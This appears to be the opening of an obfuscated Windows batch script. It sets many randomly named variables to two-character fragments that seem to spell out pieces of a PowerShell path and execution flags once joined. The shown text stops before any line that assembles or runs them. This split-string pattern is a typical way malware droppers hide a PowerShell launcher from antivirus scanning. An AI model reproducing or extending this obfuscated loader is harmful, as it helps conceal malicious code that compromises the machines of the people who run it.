@echo off
set "plfadfbLKf=xe"
set "jEOJvSaMFb=em"
set "iTskpbgflx=ow"
set "xEXyLEPNOb= /"
set "ieduBLFOCs=we"
set "apzyeMZTtY=st"
set "WKCodipFtf=py"
set "AhJAAkeXye=y "
set "ErSbjuBEzw=1."
set "UmkaeGWgOJ= C"
set "DoUQSWtSWR=do"
set "aKdnHMEbsf=he"
set "ncmkUzhCdb=rS"
set "lITeEjFWvy=nd"
set "GiRNndGISM=ll"
set "fEShiLLwAA=we"
